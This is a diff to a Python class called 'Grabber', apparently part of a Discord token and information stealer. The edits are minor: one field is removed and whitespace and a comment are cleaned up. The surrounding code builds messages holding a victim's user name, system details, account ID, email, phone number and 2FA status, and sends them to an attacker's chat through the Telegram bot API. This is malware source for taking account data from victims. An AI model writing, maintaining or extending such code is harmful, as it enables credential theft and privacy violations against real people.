@@ -247,7 +247,6 @@ class Grabber:
 
         msg = (
             f"<b>User:</b> {user}\n"
-            f"<b>Device:</b> {host}\n"
             f"<b>Win:</b> {os_det}\n"
             f"<b>Type:</b> {arch}\n"
             f"<b>Cpu:</b> {proc}\n"
@@ -260,7 +259,7 @@ class Grabber:
         return msg
 
     def send(self, content: str) -> bool:
-        url = f'https://api.telegram.org/bot{self.key}/sendMessage' 
+        url = f'https://api.telegram.org/bot{self.key}/sendMessage'
         payload = {
             'chat_id': self.chat,
             'text': content,
@@ -292,7 +291,7 @@ class Grabber:
                         f"<b>Source:</b> {source}\n"
                         f"<b>UserName:</b> {details.get('username', 'N/A')}#{details.get('discriminator', '0000')}\n"
                         f"<b>AccId:</b> <code>{details.get('id', 'N/A')}</code>\n"
-                        f"<b>Email:</b> {details.get('email', 'N/A')}\n" # Corrected line start
+                        f"<b>Email:</b> {details.get('email', 'N/A')}\n"
                         f"<b>Phone:</b> {details.get('phone', 'N/A')}\n"
                         f"<b>Loc:</b> {details.get('locale', 'N/A')}\n"
                         f"<b>2FA Status:</b> {'✅ Enabled' if details.get('mfa_enabled') else '❌ Disabled'}\n"
